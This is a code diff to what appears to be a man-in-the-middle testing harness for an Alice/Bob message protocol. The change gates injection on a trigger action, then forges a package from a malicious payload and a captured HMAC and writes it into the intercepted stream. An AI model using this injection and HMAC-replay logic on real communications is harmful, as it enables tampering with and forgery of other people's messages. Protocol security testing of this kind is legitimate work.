@@ -260,53 +260,70 @@ class MitmAttackHandler:
             if (correct_direction == 'alice_to_bob' and 
                 not self.global_state.state['injected'] and 
                 self.global_state.state['stored_hmac']):
-                if self.attack_log:
-                    logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
                 
-                # Get the malicious payload for bob_to_alice direction (this is what we intercepted)
-                malicious_payload_hex = self.payload_handler.get_attack_payload("bob_to_alice")
+                # Check if we should inject based on the current message action
+                should_inject = False
+                injection_trigger = self.payload_handler.get_injection_trigger("alice_to_bob")
                 
-                # Craft the malicious package: malicious payload + captured HMAC
-                malicious_package = b''
-                if malicious_payload_hex:
-                    try:
-                        hex_str = malicious_payload_hex.strip()
-                        if len(hex_str) % 2 != 0:
-                            hex_str = hex_str + '0'
-                        malicious_payload = binascii.unhexlify(hex_str)
-                        
-                        # Create the full message: malicious payload + captured HMAC
-                        message_content = malicious_payload + self.global_state.state['stored_hmac']
-                        
-                        # Add the 4-byte length header (big-endian)
-                        message_length = len(message_content)
-                        length_header = message_length.to_bytes(4, byteorder='big')
-                        
-                        # Final package: [4-byte length][malicious payload][captured HMAC]
-                        malicious_package = length_header + message_content
-                        
+                if injection_trigger and isinstance(raw_msg, dict):
+                    # Check if this message contains the trigger action
+                    if 'action' in raw_msg and raw_msg['action'] == injection_trigger:
+                        should_inject = True
                         if self.attack_log:
-                            logging.info(f"[MITM] Crafted malicious package: {len(length_header)} bytes header + {len(malicious_payload)} bytes payload + {len(self.global_state.state['stored_hmac'])} bytes HMAC = {len(malicious_package)} total bytes")
-                            logging.info(f"[MITM] Message length in header: {message_length}")
-                    except Exception as e:
-                        logging.error(f"[MITM] Error crafting malicious package: {e}")
-                        # Fallback: just send HMAC with proper header
+                            logging.info(f"[MITM] *** Injection trigger '{injection_trigger}' detected, injecting malicious payload ***")
+                
+                if should_inject:
+                    if self.attack_log:
+                        logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after trigger action ***")
+                    
+                    # Get the malicious payload for bob_to_alice direction (this is what we intercepted)
+                    malicious_payload_hex = self.payload_handler.get_attack_payload("bob_to_alice")
+                    
+                    # Craft the malicious package: malicious payload + captured HMAC
+                    malicious_package = b''
+                    if malicious_payload_hex:
+                        try:
+                            hex_str = malicious_payload_hex.strip()
+                            if len(hex_str) % 2 != 0:
+                                hex_str = hex_str + '0'
+                            malicious_payload = binascii.unhexlify(hex_str)
+                            
+                            # Create the full message: malicious payload + captured HMAC
+                            message_content = malicious_payload + self.global_state.state['stored_hmac']
+                            
+                            # Add the 4-byte length header (big-endian)
+                            message_length = len(message_content)
+                            length_header = message_length.to_bytes(4, byteorder='big')
+                            
+                            # Final package: [4-byte length][malicious payload][captured HMAC]
+                            malicious_package = length_header + message_content
+                            
+                            if self.attack_log:
+                                logging.info(f"[MITM] Crafted malicious package: {len(length_header)} bytes header + {len(malicious_payload)} bytes payload + {len(self.global_state.state['stored_hmac'])} bytes HMAC = {len(malicious_package)} total bytes")
+                                logging.info(f"[MITM] Message length in header: {message_length}")
+                        except Exception as e:
+                            logging.error(f"[MITM] Error crafting malicious package: {e}")
+                            # Fallback: just send HMAC with proper header
+                            message_content = self.global_state.state['stored_hmac']
+                            message_length = len(message_content)
+                            length_header = message_length.to_bytes(4, byteorder='big')
+                            malicious_package = length_header + message_content
+                    else:
+                        # No malicious payload, just send HMAC with proper header
                         message_content = self.global_state.state['stored_hmac']
                         message_length = len(message_content)
                         length_header = message_length.to_bytes(4, byteorder='big')
                         malicious_package = length_header + message_content
-                else:
-                    # No malicious payload, just send HMAC with proper header
-                    message_content = self.global_state.state['stored_hmac']
-                    message_length = len(message_content)
-                    length_header = message_length.to_bytes(4, byteorder='big')
-                    malicious_package = length_header + message_content
-                
-                writer.write(malicious_package)
-                await writer.drain()
-                if self.attack_log:
-                    logging.info(f"[MITM] Injected malicious package with captured HMAC after successful authentication.")
-                self.global_state.state['injected'] = True
+                    
+                    writer.write(malicious_package)
+                    await writer.drain()
+                    if self.attack_log:
+                        logging.info(f"[MITM] Injected malicious package with captured HMAC after trigger action.")
+                    self.global_state.state['injected'] = True
+                elif self.attack_log and injection_trigger:
+                    # Log that we're waiting for the trigger action
+                    if isinstance(raw_msg, dict) and 'action' in raw_msg:
+                        logging.info(f"[MITM] Waiting for injection trigger '{injection_trigger}', current action: '{raw_msg['action']}'")
             return True
             
         # If we're in attack mode but haven't seen a challenge yet, just forward normally
